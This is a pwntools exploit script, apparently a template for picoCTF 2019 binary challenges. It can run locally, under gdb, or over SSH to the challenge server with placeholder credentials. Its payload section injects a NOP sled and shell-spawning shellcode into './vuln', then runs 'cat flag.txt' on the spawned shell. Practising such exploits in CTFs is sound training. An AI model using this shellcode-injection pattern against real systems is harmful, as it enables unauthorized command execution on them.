#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
############################################################
#==========================================================#
#                   SETTING UP VARIABLES                   #
#==========================================================#
############################################################

os ='linux'
arch ='i386' 
exe = './vuln'
script = 'b* main'
r_host = '2019shell1.picoctf.com'
r_dir = '/path/to/remote/file'
r_user = 'User'
r_passwd = 'Pa$$w0rd'
r_port = '1234' 
s = ''
local = False
remote = False
debug = False
mode = ''
io = ''
data = ''
begin = ''
end = ''
i = ''

context.log_level = 'debug'
context.update(os=os, arch=arch)
#############################################################
#===========================================================#
#                   FUNCTION DEFINITIONS                    #
#===========================================================#
#############################################################

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# attach_gdb()                                              #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Attaches gdb to the running process.                      #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def attach_gdb():
    gdb.attach(io, gdbscript=script)
    
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# get_flag()                                                #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Checks output for the 'pico' flag and either prints it or #
# exits if no data is sent.                                 #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def get_flag():
    global data
    global io

    data = io.recv(timeout=5)

    if data == b'':
        log.info('')
        log.info('')
        log.info('Something went wrong, no data received. Exiting... >_<')
        exit()

    if b'pico' in data:
        log.info('')
        log.info('')
        log.info(f"Pwned! Here's your flag: {data}")
        log.info('')
        log.info('')

    io.close()
    
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Start()                                                   #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Prompts for the startup mode (local, remote, debug) and   #
# sets the appropriate variables and startup assignemnts.   #
# loops 3 times for input if not entered in correctly.      #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def start():
    global local
    global remote
    global debug
    global begin
    global mode
    global io
    global s

    i = 3

    begin = time.time()
    
    while i != 0:
        print('')
        mode = input('Start exploit in local, remote or debug mode? ')
        print('')
        if str('remote') in mode:
            remote = True
            break
        elif str('local') in mode:
            local = True
            break
        elif str('debug') in mode:
            debug = True
            break
        elif i == 0:
            log.info(f'Exploit mode entered incorrectly. Maximum number of retries exceeded: {i}. Exiting... >_<')
            exit()
        else:
            i -= 1
            log.info('')
            log.info(f'Incorrect mode selected. Enter local, remote, or debug only')
            log.info(f'Number of retries: {i}')
            log.info('')
            log.info('')
        
    if debug:
        io = process(exe)
        attach_gdb()
        log.info('')
        log.info('')
        log.info('Attaching gdb to running process')
        log.info(f'gdb script = {script}')
        log.info('Opening pwndbg...')
        log.info('')
        log.info('')

    elif remote:
        context.update(log_level = 'info')
        s = ssh(host=r_host, user=r_user, password=r_passwd)
        io = s.process(exe, cwd=r_dir)
        log.info('')
        log.info('')
        log.info('Remote variables set:')
        log.info(f'Remote host = {r_host}')
        log.info(f'Remote user = {r_user}')
        log.info(f'Changing working directory to: {r_dir} ')
        log.info('Starting remote exploit...')
        log.info('')
        log.info('')

    elif local:
        io = process(exe)
        log.info('Starting local exploit ...')
        log.info('')
        log.info('')

    else:
        log.info('Incorrect mode selected. Exiting...  >_< ')
        exit()  
 
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Finish()                                                   #
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #
# Prints script run time and then closes the running process.#
# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ #

def finish():
  global end
  
  end = time.time()
  run_time = end - begin
  io.close()
  print(f'Time elapsed: {run_time:.2f}')

##############################################################
#=========================================================== #
#                    EXPLOIT GOES HERE                       #
#=========================================================== #
##############################################################

start()

padding = b'\x90' * 256
shellcode = asm(shellcraft.sh())

payload = padding + shellcode

print(io.recv())

io.sendline(payload)

print(io.recv())

io.sendline(b'cat flag.txt')

get_flag()

finish()

##############################################################
#============================================================#
#                       END OF SCRIPT                        #
#============================================================#
##############################################################


